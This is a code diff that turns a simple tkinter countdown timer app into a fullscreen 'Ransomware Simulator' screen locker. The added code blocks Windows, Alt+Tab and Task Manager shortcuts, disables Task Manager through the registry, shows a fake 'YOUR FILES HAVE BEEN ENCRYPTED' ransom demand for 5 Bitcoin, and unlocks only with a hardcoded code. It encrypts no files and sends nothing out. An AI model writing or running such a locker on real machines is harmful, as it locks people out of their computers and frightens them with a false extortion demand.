@@ -1,140 +1,125 @@
 import tkinter as tk
+import threading
 import time
+import keyboard  # pip install keyboard
+import subprocess
 
-class TimerApp:
-    def __init__(self, root):
-        self.root = root
-        self.root.title("🐧美极计时器🐧")
-        self.root.attributes('-topmost', True)
-        self.root.geometry("340x260")
-        self.root.resizable(False, False)
+UNLOCK_CODE = "hunter2"
 
-        # 渐变背景
-        self.bg_canvas = tk.Canvas(root, width=340, height=260, highlightthickness=0)
-        self.bg_canvas.place(x=0, y=0, relwidth=1, relheight=1)
-        self.draw_gradient(self.bg_canvas, "#4e54c8", "#8f94fb")
+def block_keys():
+    keys_to_block = [
+        'left windows', 'right windows',
+        'alt+tab', 'ctrl+esc', 'alt+esc',
+        'alt+f4', 'ctrl+shift+esc'
+    ]
+    try:
+        for key in keys_to_block:
+            keyboard.block_key(key)
+    except:
+        pass
 
-        # 内容框架，白色
-        self.content_frame = tk.Frame(root, bg="#ffffff")
-        self.content_frame.place(relx=0.5, rely=0.5, anchor="center", width=300, height=220)
+def unblock_keys():
+    keys_to_unblock = [
+        'left windows', 'right windows',
+        'alt+tab', 'ctrl+esc', 'alt+esc',
+        'alt+f4', 'ctrl+shift+esc'
+    ]
+    try:
+        for key in keys_to_unblock:
+            keyboard.unblock_key(key)
+    except:
+        pass
 
-        self.running = False
-        self.start_time = None
-        self.time_limit = 0
-        self.elapsed = 0
-        self.overtime = 0
+def disable_task_manager():
+    # Disable Task Manager via registry (requires admin)
+    # Optional: remove if no admin rights
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+    except FileNotFoundError:
+        try:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
+                                  r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
+        except Exception:
+            return
+    except Exception:
+        return
+    try:
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+    except Exception:
+        pass
 
-        self.label = tk.Label(self.content_frame, text="00:00:00", font=("Arial", 36, "bold"), fg="#222", bg="#ffffff")
-        self.label.pack(pady=8)
+def enable_task_manager():
+    try:
+        import winreg
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
+        winreg.CloseKey(key)
+    except Exception:
+        pass
 
-        # 快速设置按钮
-        quick_frame = tk.Frame(self.content_frame, bg="#ffffff")
-        quick_frame.pack(pady=(0, 3))
-        for min_ in [10, 15, 20, 40]:
-            btn = tk.Button(
-                quick_frame, text=f"{min_}分钟", font=("Arial", 11),
-                command=lambda m=min_: self.quick_set(m), 
-                bg="#e3e6fd", fg="#4e54c8", activebackground="#c0c7fa", relief="flat", bd=0, width=6, height=1
-            )
-            btn.pack(side="left", padx=4)
+def main():
+    disable_task_manager()
+    block_keys()
 
-        self.entry = tk.Entry(self.content_frame, font=("Arial", 16), width=10, justify="center", bg="#f7f7fa", relief="flat")
-        self.entry.insert(0, "05:00")
-        self.entry.pack(pady=5)
+    root = tk.Tk()
+    root.title("Ransomware Simulator")
+    root.attributes("-fullscreen", True)
+    root.configure(bg='black')
 
-        btn_frame = tk.Frame(self.content_frame, bg="#ffffff")
-        btn_frame.pack(fill="x", pady=10, padx=6)
+    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable close button
+    root.bind("<Escape>", lambda e: "break")         # Disable Escape
+    root.bind("<Alt-F4>", lambda e: "break")         # Disable Alt+F4
 
-        self.start_btn = tk.Button(btn_frame, text="开始", font=("Arial", 14), command=self.start, bg="#6a82fb", fg="white", activebackground="#4e54c8", relief="flat", bd=0)
-        self.pause_btn = tk.Button(btn_frame, text="暂停", font=("Arial", 14), command=self.pause, state='disabled', bg="#bdbdbd", fg="white", activebackground="#888", relief="flat", bd=0)
-        self.reset_btn = tk.Button(btn_frame, text="重置", font=("Arial", 14), command=self.reset, bg="#ffb347", fg="white", activebackground="#ffcc80", relief="flat", bd=0)
+    label1 = tk.Label(root, text="YOUR FILES HAVE BEEN ENCRYPTED", fg="red", bg="black", font=("Courier", 36, "bold"))
+    label1.pack(pady=20)
 
-        self.start_btn.grid(row=0, column=0, sticky="ew", padx=4)
-        self.pause_btn.grid(row=0, column=1, sticky="ew", padx=4)
-        self.reset_btn.grid(row=0, column=2, sticky="ew", padx=4)
+    label2 = tk.Label(root, text="You have to pay 5 Bitcoin to unlock this computer's files.",
+                      fg="lime", bg="black", font=("Courier", 24))
+    label2.pack(pady=10)
 
-        btn_frame.grid_columnconfigure(0, weight=1, minsize=80)
-        btn_frame.grid_columnconfigure(1, weight=1, minsize=80)
-        btn_frame.grid_columnconfigure(2, weight=1, minsize=80)
+    timer_label = tk.Label(root, text="", fg="lime", bg="black", font=("Courier", 28))
+    timer_label.pack(pady=30)
 
-    def draw_gradient(self, canvas, color1, color2):
-        r1, g1, b1 = self.root.winfo_rgb(color1)
-        r2, g2, b2 = self.root.winfo_rgb(color2)
-        r_ratio = (r2 - r1) / 260
-        g_ratio = (g2 - g1) / 260
-        b_ratio = (b2 - b1) / 260
-        for i in range(260):
-            nr = int(r1 + (r_ratio * i))
-            ng = int(g1 + (g_ratio * i))
-            nb = int(b1 + (b_ratio * i))
-            color = f"#{nr//256:02x}{ng//256:02x}{nb//256:02x}"
-            canvas.create_line(0, i, 340, i, fill=color)
+    prompt = tk.Label(root, text="Enter decryption key:", fg="lime", bg="black", font=("Courier", 18))
+    prompt.pack()
 
-    def quick_set(self, mins):
-        self.entry.config(state='normal', bg="#f7f7fa")
-        self.entry.delete(0, tk.END)
-        self.entry.insert(0, f"{mins:02d}:00")
+    entry = tk.Entry(root, font=("Courier", 18), width=30, show="*")
+    entry.pack(pady=10)
 
-    def start(self):
-        if not self.running:
-            if self.start_time is None:
-                try:
-                    mins, secs = map(int, self.entry.get().split(":"))
-                    self.time_limit = mins * 60 + secs
-                    self.entry.config(bg="#f7f7fa")
-                except:
-                    self.entry.delete(0, tk.END)
-                    self.entry.insert(0, "格式:mm:ss")
-                    self.entry.config(bg="#ffd1d1")
-                    return
-                self.start_time = time.time()
-            else:
-                self.start_time = time.time() - self.elapsed
-            self.running = True
-            self.start_btn.config(state='disabled')
-            self.pause_btn.config(state='normal')
-            self.entry.config(state='disabled', bg="#f7f7fa")
-            self.update_timer()
-    
-    def update_timer(self):
-        if self.running:
-            self.elapsed = int(time.time() - self.start_time)
-            if self.elapsed <= self.time_limit:
-                remain = self.time_limit - self.elapsed
-                self.label.config(text=self.format_time(remain), fg="#222")
-            else:
-                self.overtime = self.elapsed - self.time_limit
-                self.label.config(text=f"超时 {self.format_time(self.overtime)}", fg="#e53935")
-            self.root.after(1000, self.update_timer)
-    
-    def pause(self):
-        if self.running:
-            self.running = False
-            self.start_btn.config(state='normal')
-            self.pause_btn.config(state='disabled')
-    
-    def reset(self):
-        self.running = False
-        self.start_time = None
-        self.elapsed = 0
-        self.overtime = 0
-        self.label.config(text="00:00:00", fg="#222")
-        self.start_btn.config(state='normal')
-        self.pause_btn.config(state='disabled')
-        self.entry.config(state='normal', bg="#f7f7fa")
-        self.entry.delete(0, tk.END)
-        self.entry.insert(0, "05:00")
-    
-    def format_time(self, seconds):
-        h = seconds // 3600
-        m = (seconds % 3600) // 60
-        s = seconds % 60
-        if h > 0:
-            return f"{h:02d}:{m:02d}:{s:02d}"
+    status = tk.Label(root, text="", fg="yellow", bg="black", font=("Courier", 14))
+    status.pack()
+
+    def check_key(event=None):
+        if entry.get().strip().lower() == UNLOCK_CODE:
+            unblock_keys()
+            enable_task_manager()
+            root.destroy()
         else:
-            return f"{m:02d}:{s:02d}"
+            status.config(text="INVALID DECRYPTION KEY")
+
+    entry.bind("<Return>", check_key)
+
+    def countdown():
+        total = 14 * 365 * 24 * 60 * 60
+        while total > 0:
+            yrs = total // (365 * 24 * 3600)
+            rem = total % (365 * 24 * 3600)
+            days = rem // (24 * 3600)
+            hrs = (rem % (24 * 3600)) // 3600
+            mins = (rem % 3600) // 60
+            secs = total % 60
+            timer_label.config(text=f"Time Remaining: {yrs}y {days}d {hrs:02}:{mins:02}:{secs:02}")
+            time.sleep(1)
+            total -= 1
+        timer_label.config(text="FILES PERMANENTLY LOST")
+
+    threading.Thread(target=countdown, daemon=True).start()
+
+    root.mainloop()
 
 if __name__ == "__main__":
-    root = tk.Tk()
-    app = TimerApp(root)
-    root.mainloop()
+    main()
